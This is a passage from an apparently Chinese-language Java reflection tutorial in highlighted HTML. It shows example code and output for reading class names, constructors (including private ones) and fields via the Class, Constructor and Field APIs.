mAnimalPrivate;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> mAnimalProtected;<br>    <span class="hljs-keyword">int</span> mAnimalDefault;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> mAnimalPublic;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> sAnimalPrivate;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> sAnimalProtected;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> sAnimalDefault;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> sAnimalPublic;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Animal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">I1</span>, <span class="hljs-title">I2</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> mDogPrivate;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> mDogPublic;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> mDogProtected;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> mDogDefault;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> sDogPrivate;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> sDogProtected;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> sDogDefault;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> sDogPublic;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, InstantiationException </span>&#123;<br>        Class&lt;Dog&gt; dog = Dog.class;<br>        <span class="hljs-comment">//类名打印</span><br>        System.out.println(dog.getName()); <span class="hljs-comment">//com.cry.Dog</span><br>        System.out.println(dog.getSimpleName()); <span class="hljs-comment">//Dog</span><br>        System.out.println(dog.getCanonicalName());<span class="hljs-comment">//com.cry.Dog</span><br>        <span class="hljs-comment">//接口</span><br>        System.out.println(dog.isInterface()); <span class="hljs-comment">//false</span><br>        <span class="hljs-keyword">for</span> (Class iI : dog.getInterfaces()) &#123;<br>            System.out.println(iI);<br>        &#125;<br>         <span class="hljs-comment">/*</span><br><span class="hljs-comment">          interface com.cry.I1</span><br><span class="hljs-comment">          interface com.cry.I2</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-comment">//父类</span><br>        System.out.println(dog.getSuperclass());<span class="hljs-comment">//class com.cry.Animal</span><br>        <span class="hljs-comment">//创建对象</span><br>        Dog d = dog.newInstance();<br>        <span class="hljs-comment">//字段</span><br>        <span class="hljs-keyword">for</span> (Field f : dog.getFields()) &#123;<br>            System.out.println(f.getName());<br>        &#125;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            mDogPublic</span><br><span class="hljs-comment">            sDogPublic</span><br><span class="hljs-comment">            mAnimalPublic</span><br><span class="hljs-comment">            sAnimalPublic</span><br><span class="hljs-comment">            mCellPublic  //父类的父类的公共字段也打印出来了</span><br><span class="hljs-comment">         */</span><br>        System.out.println(<span class="hljs-string">&quot;---------&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Field f : dog.getDeclaredFields()) &#123;<br>            System.out.println(f.getName());<br>        &#125;<br>        <span class="hljs-comment">/** 只有自己类声明的字段</span><br><span class="hljs-comment">         mDogPrivate</span><br><span class="hljs-comment">         mDogPublic</span><br><span class="hljs-comment">         mDogProtected</span><br><span class="hljs-comment">         mDogDefault</span><br><span class="hljs-comment">         sDogPrivate</span><br><span class="hljs-comment">         sDogProtected</span><br><span class="hljs-comment">         sDogDefault</span><br><span class="hljs-comment">         sDogPublic</span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><strong>getName、getCanonicalName与getSimpleName的区别：</strong></p><ul><li><p>getSimpleName：只获取类名。</p></li><li><p>getName：类的全限定名，jvm中Class的表示，可以用于动态加载Class对象，例如Class.forName。</p></li><li><p>getCanonicalName：返回更容易理解的表示，主要用于输出（toString）或log打印，大多数情况下和getName一样，但是在内部类、数组等类型的表示形式就不同了。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cry;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">inner</span></span>&#123;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">//普通类</span><br>        System.out.println(Test.class.getSimpleName()); <span class="hljs-comment">//Test</span><br>        System.out.println(Test.class.getName()); <span class="hljs-comment">//com.cry.Test</span><br>        System.out.println(Test.class.getCanonicalName()); <span class="hljs-comment">//com.cry.Test</span><br>        <span class="hljs-comment">//内部类</span><br>        System.out.println(inner.class.getSimpleName()); <span class="hljs-comment">//inner</span><br>        System.out.println(inner.class.getName()); <span class="hljs-comment">//com.cry.Test$inner</span><br>        System.out.println(inner.class.getCanonicalName()); <span class="hljs-comment">//com.cry.Test.inner</span><br>        <span class="hljs-comment">//数组</span><br>        System.out.println(args.getClass().getSimpleName()); <span class="hljs-comment">//String[]</span><br>        System.out.println(args.getClass().getName()); <span class="hljs-comment">//[Ljava.lang.String;</span><br>        System.out.println(args.getClass().getCanonicalName()); <span class="hljs-comment">//java.lang.String[]</span><br>        <span class="hljs-comment">//我们不能用getCanonicalName去加载类对象，必须用getName</span><br>        <span class="hljs-comment">//Class.forName(inner.class.getCanonicalName()); 报错</span><br>        Class.forName(inner.class.getName());<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="2-2-获取构造方法"><a href="#2-2-获取构造方法" class="headerlink" title="2.2 获取构造方法"></a>2.2 获取构造方法</h3><p>Constructor类存在于反射包(java.lang.reflect)中，反映的是Class 对象所表示的类的构造方法。获取Constructor对象是通过Class类中的方法获取的。</p><p>Class类与Constructor相关的主要方法：</p><table><thead><tr><th align="center">方法返回值</th><th align="center">方法名称</th><th align="center">方法说明</th></tr></thead><tbody><tr><td align="center">static Class&lt;?&gt;</td><td align="center">forName(String className)</td><td align="center">返回与带有给定字符串名的类或接口相关联的 Class 对象。</td></tr><tr><td align="center">Constructor</td><td align="center">getConstructor(Class&lt;?&gt;… parameterTypes)</td><td align="center">返回指定参数类型、具有public访问权限的构造函数对象</td></tr><tr><td align="center">Constructor&lt;?&gt;[]</td><td align="center">getConstructors()</td><td align="center">返回所有具有public访问权限的构造函数的Constructor对象数组</td></tr><tr><td align="center">Constructor</td><td align="center">getDeclaredConstructor(Class&lt;?&gt;… parameterTypes)</td><td align="center">返回指定参数类型、所有声明的（包括private）构造函数对象</td></tr><tr><td align="center">Constructor&lt;?&gt;[]</td><td align="center">getDeclaredConstructor()</td><td align="center">返回所有声明的（包括private）构造函数对象</td></tr><tr><td align="center">T</td><td align="center">newInstance()</td><td align="center">调用无参构造器创建此 Class 对象所表示的类的一个新实例。</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConstructionTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        Class&lt;?&gt; clazz = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-comment">//获取Class对象的引用</span><br>        clazz = Class.forName(<span class="hljs-string">&quot;com.example.javabase.User&quot;</span>);<br><br>        <span class="hljs-comment">//第一种方法，实例化默认构造方法，User必须无参构造函数,否则将抛异常</span><br>        User user = (User) clazz.newInstance();<br>        user.setAge(<span class="hljs-number">20</span>);<br>        user.setName(<span class="hljs-string">&quot;Jack&quot;</span>);<br>        System.out.println(user);<br><br>        System.out.println(<span class="hljs-string">&quot;--------------------------------------------&quot;</span>);<br><br>        <span class="hljs-comment">//获取带String参数的public构造函数</span><br>        Constructor cs1 =clazz.getConstructor(String.class);<br>        <span class="hljs-comment">//创建User</span><br>        User user1= (User) cs1.newInstance(<span class="hljs-string">&quot;hiway&quot;</span>);<br>        user1.setAge(<span class="hljs-number">22</span>);<br>        System.out.println(<span class="hljs-string">&quot;user1:&quot;</span>+user1.toString());<br><br>        System.out.println(<span class="hljs-string">&quot;--------------------------------------------&quot;</span>);<br><br>        <span class="hljs-comment">//取得指定带int和String参数构造函数,该方法是私有构造private</span><br>        Constructor cs2=clazz.getDeclaredConstructor(<span class="hljs-keyword">int</span>.class,String.class);<br>        <span class="hljs-comment">//由于是private必须设置可访问</span><br>        cs2.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">//创建user对象</span><br>        User user2= (User) cs2.newInstance(<span class="hljs-number">25</span>,<span class="hljs-string">&quot;hiway2&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;user2:&quot;</span>+user2.toString());<br><br>        System.out.println(<span class="hljs-string">&quot;--------------------------------------------&quot;</span>);<br><br>        <span class="hljs-comment">//获取所有构造包含private</span><br>        Constructor&lt;?&gt; cons[] = clazz.getDeclaredConstructors();<br>        <span class="hljs-comment">// 查看每个构造方法需要的参数</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; cons.length; i++) &#123;<br>            <span class="hljs-comment">//获取构造函数参数类型</span><br>            Class&lt;?&gt; clazzs[] = cons[i].getParameterTypes();<br>            System.out.println(<span class="hljs-string">&quot;构造函数[&quot;</span>+i+<span class="hljs-string">&quot;]:&quot;</span>+cons[i].toString() );<br>            System.out.print(<span class="hljs-string">&quot;参数类型[&quot;</span>+i+<span class="hljs-string">&quot;]:(&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; clazzs.length; j++) &#123;<br>                <span class="hljs-keyword">if</span> (j == clazzs.length - <span class="hljs-number">1</span>)<br>                    System.out.print(clazzs[j].getName());<br>                <span class="hljs-keyword">else</span><br>                    System.out.print(clazzs[j].getName() + <span class="hljs-string">&quot;,&quot;</span>);<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;)&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 私有构造</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> age</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">User</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age, String name)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        <span class="hljs-keyword">this</span>.age = age;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-comment">// output </span><br>User&#123;age=<span class="hljs-number">20</span>, name=<span class="hljs-string">&#x27;Jack&#x27;</span>&#125;<br>--------------------------------------------<br>user1:User&#123;age=<span class="hljs-number">22</span>, name=<span class="hljs-string">&#x27;hiway&#x27;</span>&#125;<br>--------------------------------------------<br>user2:User&#123;age=<span class="hljs-number">25</span>, name=<span class="hljs-string">&#x27;hiway2&#x27;</span>&#125;<br>--------------------------------------------<br>构造函数[<span class="hljs-number">0</span>]:<span class="hljs-keyword">private</span> com.example.javabase.User(<span class="hljs-keyword">int</span>,java.lang.String)<br>参数类型[<span class="hljs-number">0</span>]:(<span class="hljs-keyword">int</span>,java.lang.String)<br>构造函数[<span class="hljs-number">1</span>]:<span class="hljs-keyword">public</span> com.example.javabase.User(java.lang.String)<br>参数类型[<span class="hljs-number">1</span>]:(java.lang.String)<br>构造函数[<span class="hljs-number">2</span>]:<span class="hljs-keyword">public</span> com.example.javabase.User()<br>参数类型[<span class="hljs-number">2</span>]:()<br></code></pre></div></td></tr></table></figure><p>Constructor类本身一些常用方法：</p><table><thead><tr><th align="center">方法返回值</th><th align="center">方法名称</th><th align="center">方法说明</th></tr></thead><tbody><tr><td align="center">Class</td><td align="center">getDeclaringClass()</td><td align="center">返回 Class 对象，该对象表示声明由此 Constructor 对象表示的构造方法的类,其实就是返回真实类型（不包含参数）</td></tr><tr><td align="center">Type[]</td><td align="center">getGenericParameterTypes()</td><td align="center">按照声明顺序返回一组 Type 对象，返回的就是 Constructor对象构造函数的形参类型。</td></tr><tr><td align="center">String</td><td align="center">getName()</td><td align="center">以字符串形式返回此构造方法的名称。</td></tr><tr><td align="center">Class&lt;?&gt;[]</td><td align="center">getParameterTypes()</td><td align="center">按照声明顺序返回一组 Class 对象，即返回Constructor 对象所表示构造方法的形参类型</td></tr><tr><td align="center">T</td><td align="center">newInstance(Object… initargs)</td><td align="center">使用此 Constructor对象表示的构造函数来创建新实例</td></tr><tr><td align="center">String</td><td align="center">toGenericString()</td><td align="center">返回描述此 Constructor 的字符串，其中包括类型参数。</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Constructor cs3 = clazz.getDeclaredConstructor(<span class="hljs-keyword">int</span>.class,String.class);<br>System.out.println(<span class="hljs-string">&quot;-----getDeclaringClass-----&quot;</span>);<br>Class uclazz=cs3.getDeclaringClass();<br><span class="hljs-comment">//Constructor对象表示的构造方法的类</span><br>System.out.println(<span class="hljs-string">&quot;构造方法的类:&quot;</span>+uclazz.getName());<br><br>System.out.println(<span class="hljs-string">&quot;-----getGenericParameterTypes-----&quot;</span>);<br><span class="hljs-comment">//对象表示此 Constructor 对象所表示的方法的形参类型</span><br>Type[] tps=cs3.getGenericParameterTypes();<br><span class="hljs-keyword">for</span> (Type tp:tps) &#123;<br>    System.out.println(<span class="hljs-string">&quot;参数名称tp:&quot;</span>+tp);<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;-----getParameterTypes-----&quot;</span>);<br><span class="hljs-comment">//获取构造函数参数类型</span><br>Class&lt;?&gt; clazzs[] = cs3.getParameterTypes();<br><span class="hljs-keyword">for</span> (Class claz:clazzs) &#123;<br>    System.out.println(<span class="hljs-string">&quot;参数名称:&quot;</span>+claz.getName());<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;-----getName-----&quot;</span>);<br><span class="hljs-comment">//以字符串形式返回此构造方法的名称</span><br>System.out.println(<span class="hljs-string">&quot;getName:&quot;</span>+cs3.getName());<br><br>System.out.println(<span class="hljs-string">&quot;-----getoGenericString-----&quot;</span>);<br><span class="hljs-comment">//返回描述此 Constructor 的字符串，其中包括类型参数。</span><br>System.out.println(<span class="hljs-string">&quot;getoGenericString():&quot;</span>+cs3.toGenericString());<br><br><br><br><span class="hljs-comment">//输出结果</span><br>-----getDeclaringClass-----<br>构造方法的类:com.example.javabase.User<br>-----getGenericParameterTypes-----<br>参数名称tp:<span class="hljs-keyword">int</span><br>参数名称tp:<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">String</span></span><br><span class="hljs-class">-----<span class="hljs-title">getParameterTypes</span>-----</span><br>参数名称:int<br>参数名称:java.lang.String<br>-----getName-----<br>getName:com.example.javabase.User<br>-----getoGenericString-----<br>getoGenericString():<span class="hljs-keyword">private</span> com.example.javabase.User(<span class="hljs-keyword">int</span>,java.lang.String)<br><br></code></pre></div></td></tr></table></figure><h3 id="2-3-获取字段"><a href="#2-3-获取字段" class="headerlink" title="2.3 获取字段"></a>2.3 获取字段</h3><p>Field 提供有关类或接口的单个字段的信息，以及对它的动态访问权限。反射的字段可能是一个类（静态）字段或实例字段。</p><p>通过Class类的提供的方法来获取代表字段信息的Field对象，Class类与Field对象相关方法：</p><table><thead><tr><th align="center">方法返回值</th><th align="center">方法名称</th><th align="center">方法说明</th></tr></thead><tbody><tr><td align="center">Field</td><td align="center">getDeclaredField(String name)</td><td align="center">获取指定name名称的(包含private修饰的)字段，不包括继承的字段</td></tr><tr><td align="center">Field[]</td><td align="center">getDeclaredField()</td><td align="center">获取Class对象所表示的类或接口的所有(包含private修饰的)字段,不包括继承的字段</td></tr><tr><td align="center">Field</td><td align="center">getField(String name)</td><td align="center">获取指定name名称、具有public修饰的字段，包含继承字段</td></tr><tr><td align="center">Field[]</td><td align="center">getField()</td><td align="center">获取修饰符为public的字段，包含继承字段</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReflectField</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException </span>&#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;reflect.Student&quot;</span>);<br>        <span class="hljs-comment">//获取指定字段名称的Field类,注意字段修饰符必须为public而且存在该字段,</span><br>        <span class="hljs-comment">// 否则抛NoSuchFieldException</span><br>        Field field = clazz.getField(<span class="hljs-string">&quot;age&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;field:&quot;</span>+field);<br><br>        <span class="hljs-comment">//获取所有修饰符为public的字段,包含父类字段,注意修饰符为public才会获取</span><br>        Field fields[] = clazz.getFields();<br>        <span class="hljs-keyword">for</span> (Field f:fields) &#123;<br>            System.out.println(<span class="hljs-string">&quot;f:&quot;</span>+f.getDeclaringClass());<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;================getDeclaredFields====================&quot;</span>);<br>        <span class="hljs-comment">//获取当前类所字段(包含private字段),注意不包含父类的字段</span><br>        Field fields2[] = clazz.getDeclaredFields();<br>        <span class="hljs-keyword">for</span> (Field f:fields2) &#123;<br>            System.out.println(<span class="hljs-string">&quot;f2:&quot;</span>+f.getDeclaringClass());<br>        &#125;<br>        <span class="hljs-comment">//获取指定字段名称的Field类,可以是任意修饰符的自动,注意不包含父类的字段</span><br>        Field field2 = clazz.getDeclaredField(<span class="hljs-string">&quot;desc&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;field2:&quot;</span>+field2);<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">      输出结果: </span><br><span class="hljs-comment">     field:public int reflect.Person.age</span><br><span class="hljs-comment">     f:public java.lang.String reflect.Student.desc</span><br><span class="hljs-comment">     f:public int reflect.Person.age</span><br><span class="hljs-comment">     f:public java.lang.String reflect.Person.name</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     ================getDeclaredFields====================</span><br><span class="hljs-comment">     f2:public java.lang.String reflect.Student.desc</span><br><span class="hljs-comment">     f2:private int reflect.Student.score</span><br><span class="hljs-comment">     field2:public java.lang.String reflect.Student.desc</span><br><span class="hljs-comment">     */</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-comment">//省略set和get方法</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">public</span> String desc;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> score;<br>    <span class="hljs-comment">//省略set和get方法</span><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>上述方法需要注意的是，如果我们不期望获取其父类的字段，则需使用Class类的getDeclaredField/getDeclaredFields方法来获取字段即可，倘若需要连带获取到父类的字段，那么请使用Class类的getField/getFields，但是也只能获取到public修饰的的字段，无法获取父类的私有字段。</p><p>通过Field类本身的方法对指定类属性赋值：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//获取Class对象引用</span><br>Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;reflect.Student&quot;</span>);<br><br>Student st= (Student) clazz.newInstance();<br><span class="hljs-comment">//获取父类public字段并赋值</span><br>Field ageField = clazz.getField(<span class="hljs-string">&quot;age&quot;</span>);<br>ageField.set(st,<span class="hljs-number">18</span>);<br>Field nameField = clazz.getField(<span class="hljs-string">&quot;name&quot;</span>);<br>nameField.set(st,<span 